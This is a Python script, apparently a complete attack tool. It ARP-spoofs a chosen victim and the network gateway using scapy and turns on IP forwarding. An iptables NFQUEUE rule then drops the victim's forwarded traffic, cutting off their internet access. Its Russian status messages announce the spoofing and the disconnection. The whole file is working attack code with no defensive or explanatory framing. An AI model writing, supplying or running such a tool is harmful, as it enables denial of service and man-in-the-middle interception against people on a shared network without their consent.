from threading import Thread
import sys
import scapy.all as scapy
from time import sleep
import sys
from netfilterqueue import NetfilterQueue
import subprocess
import netifaces
import os


gws = netifaces.gateways()

route_ip = gws["default"][2][0]
active_interface = gws["default"][2][1]
local_ip = netifaces.ifaddresses(active_interface)[2][0]['addr']


################ ARP SPOOF ####################


def linux_iproute(meaning):
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        print(meaning, file=f)


def get_mac(ip):
    while True:
        try:
            arp = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            pkt = broadcast/arp

            ans = scapy.srp(pkt, verbose=False, timeout=1)[0]
            return ans[0][1].hwsrc
        except:
            continue


def send_packet(target, target_spoof):
    target_mac = get_mac(target)

    arp = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=target_spoof)
    scapy.send(arp, verbose=False)


def restore(target, source):
    target_mac = get_mac(target)
    source_mac = get_mac(source)

    arp = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    
    scapy.send(arp, verbose=False)


def spoof(victim, router):
    linux_iproute(1)
    while True:
        try:
            send_packet(victim, router)
            send_packet(router, victim)
            sleep(2)
        except:
            restore(victim, router)
            restore(router, victim)
            linux_iproute(0)
            break


################ QUEUE ####################


def net_cut(packet):
    pkt = scapy.IP(packet.get_payload())

    if pkt[0].src != local_ip or pkt[0].dst != local_ip:
        packet.drop()
    else:
        packet.accept()


def modify():
    subprocess.Popen("iptables -A FORWARD -j NFQUEUE --queue-num 2", shell=True)

    queue = NetfilterQueue()
    queue.bind(2, net_cut)
    try:
        queue.run()
    except KeyboardInterrupt:
        subprocess.Popen("iptables -F", shell=True)
        exit()


################### MAIN #####################


if "SUDO_COMMAND" not in os.environ.keys():
    print("Данная программа треубет прав супер пользователя")
    exit()


print("[*] Начинаю спуфить")
Thread(target=spoof, args=[sys.argv[1], route_ip]).start()

print("[*] Отключаю интернет")
modify()
